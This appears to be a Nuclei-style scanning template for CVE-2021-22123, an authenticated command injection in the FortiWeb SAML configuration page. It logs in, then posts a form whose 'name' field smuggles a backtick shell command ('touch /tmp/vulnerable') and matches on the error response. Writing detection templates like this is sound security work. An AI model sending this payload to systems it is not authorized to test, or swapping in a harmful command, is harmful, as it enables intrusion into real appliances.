id: CVE-2021-22123

info:
  name: FortiWeb - OS command injection (Authenticated)
  author: dorkerdevil
  description: OS command injection vulnerability in FortiWeb's management interface (version 6.3.11 and prior) can allow a remote, authenticated attacker to execute arbitrary commands on the system, via the SAML server configuration page.
  reference: https://nvd.nist.gov/vuln/detail/CVE-2021-22123
  severity: critical
  tags: cve,cve2021,auth,fortiweb,forti

requests:
  - raw:
      - |
        POST /logincheck HTTP/1.1
        Host: {{Hostname}}

        ajax=1&username={{username}}&secretkey={{password}}&redir=%2F

      - |
        POST /api/v2.0/user/remoteserver.saml HTTP/1.1
        Host: {{Hostname}}
        Referer: {{RootURL}}/root/user/remote-user/saml-user/
        X-Csrftoken: {{csrf_token}}
        Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412
        Origin: {{BaseURL}}

        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="q_type"
        1
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="name"
        `touch /tmp/vulnerable`
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="entityID"
        test
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="service-path"
        /saml.sso
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="session-lifetime"
        8
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="session-timeout"
        30
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="sso-bind"
        post
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="sso-bind_val"
        1
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="sso-path"
        /SAML2/POST
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="slo-bind"
        post
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="slo-bind_val"
        1
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="slo-path"
        /SLO/POST
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="flag"
        0
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="enforce-signing"
        disable
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="enforce-signing_val"
        0
        -----------------------------94351131111899571381631694412
        Content-Disposition: form-data; name="metafile"; filename="test.xml"
        Content-Type: text/xml
        <?xml version="1.0"?>
        <md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2021-06-12T16:54:31Z" cacheDuration="PT1623948871S" entityID="test">
        <md:IDPSSODescriptor WantAuthnRequestsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
        <md:KeyDescriptor use="signing">
        <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
        <ds:X509Certificate>test</ds:X509Certificate>
        </ds:X509Data>
        </ds:KeyInfo>
        </md:KeyDescriptor>
        <md:KeyDescriptor use="encryption">
        <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
        <ds:X509Certificate>test</ds:X509Certificate>
        </ds:X509Data>
        </ds:KeyInfo>
        </md:KeyDescriptor>
        <md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat>
        <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="test"/>
        </md:IDPSSODescriptor>
        </md:EntityDescriptor>
          -----------------------------94351131111899571381631694412--

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '{"errcode":'

      - type: status
        status:
          - 500
